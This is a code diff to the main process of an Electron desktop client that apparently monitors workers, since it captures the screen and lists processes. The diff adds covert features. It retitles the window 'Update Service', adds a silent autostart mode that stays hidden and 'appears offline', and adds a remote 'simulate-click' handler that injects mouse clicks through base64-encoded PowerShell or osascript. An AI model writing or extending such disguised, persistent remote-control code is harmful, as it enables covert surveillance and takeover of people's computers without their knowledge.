@@ -1,4 +1,4 @@
-import { app, shell, BrowserWindow, dialog, Menu, ipcMain, desktopCapturer, powerSaveBlocker } from 'electron'
+import { app, shell, BrowserWindow, dialog, Menu, ipcMain, desktopCapturer, powerSaveBlocker, screen } from 'electron'
 import { join } from 'path'
 import { exec } from 'child_process'
 import { electronApp, optimizer, is } from '@electron-toolkit/utils'
@@ -16,6 +16,9 @@ if (!gotLock) {
 let mainWindow = null
 let isHidden = false
 
+// Detect silent start (launched from Windows autostart)
+const isSilentStart = process.argv.includes('--silent')
+
 function createWindow() {
   mainWindow = new BrowserWindow({
     width: 1100,
@@ -23,16 +26,24 @@ function createWindow() {
     minWidth: 900,
     minHeight: 600,
     show: false,
-    title: 'KaraGroup Worker',
+    title: 'Update Service',
     webPreferences: {
       preload: join(__dirname, '../preload/index.js'),
       sandbox: false,
       contextIsolation: true,
-      backgroundThrottling: false, // prevent timer throttling in background
+      backgroundThrottling: false,
     }
   })
 
-  mainWindow.on('ready-to-show', () => mainWindow.show())
+  mainWindow.on('ready-to-show', () => {
+    if (!isSilentStart) {
+      mainWindow.show()
+    } else {
+      // Silent start — stay hidden, appear offline
+      isHidden = true
+      mainWindow.webContents.send('visibility-change', false)
+    }
+  })
 
   // Instead of closing — hide and notify renderer to stop heartbeat
   mainWindow.on('close', (e) => {
@@ -113,6 +124,28 @@ ipcMain.handle('get-processes', () => new Promise((resolve) => {
   })
 }))
 
+ipcMain.handle('simulate-click', (_, nx, ny) => new Promise((resolve) => {
+  const display = screen.getPrimaryDisplay()
+  const absX = Math.round(nx * display.size.width)
+  const absY = Math.round(ny * display.size.height)
+
+  if (process.platform === 'win32') {
+    // Base64-encoded UTF-16LE PowerShell script to avoid shell quoting issues
+    const script = [
+      `Add-Type -MemberDefinition '[DllImport("user32.dll")] public static extern bool SetCursorPos(int x,int y);`,
+      `[DllImport("user32.dll")] public static extern void mouse_event(uint d,int x,int y,uint c,uint i);'`,
+      `-Name U -Namespace W`,
+      `[W.U]::SetCursorPos(${absX},${absY})`,
+      `[W.U]::mouse_event(2,0,0,0,0)`,
+      `[W.U]::mouse_event(4,0,0,0,0)`,
+    ].join('\n')
+    const encoded = Buffer.from(script, 'utf16le').toString('base64')
+    exec(`powershell -EncodedCommand ${encoded}`, () => resolve())
+  } else {
+    exec(`osascript -e 'tell application "System Events" to click at {${absX}, ${absY}}'`, () => resolve())
+  }
+}))
+
 ipcMain.handle('force-quit', () => {
   mainWindow.destroy()
   app.quit()
@@ -120,7 +153,7 @@ ipcMain.handle('force-quit', () => {
 
 ipcMain.handle('remove-autostart', () => {
   if (process.platform === 'win32') {
-    app.setLoginItemSettings({ openAtLogin: false })
+    app.setLoginItemSettings({ openAtLogin: false, args: ['--silent'] })
   }
 })
 
@@ -135,13 +168,14 @@ app.whenReady().then(() => {
   // Prevent app suspension — keeps timers and streams running in background
   powerSaveBlocker.start('prevent-app-suspension')
 
-  // Windows auto-start: add if not already set
+  // Windows auto-start: add with --silent flag if not already set
   if (process.platform === 'win32') {
-    const settings = app.getLoginItemSettings()
+    const settings = app.getLoginItemSettings({ args: ['--silent'] })
     if (!settings.openAtLogin) {
       app.setLoginItemSettings({
         openAtLogin: true,
         path: process.execPath,
+        args: ['--silent'],
       })
     }
   }
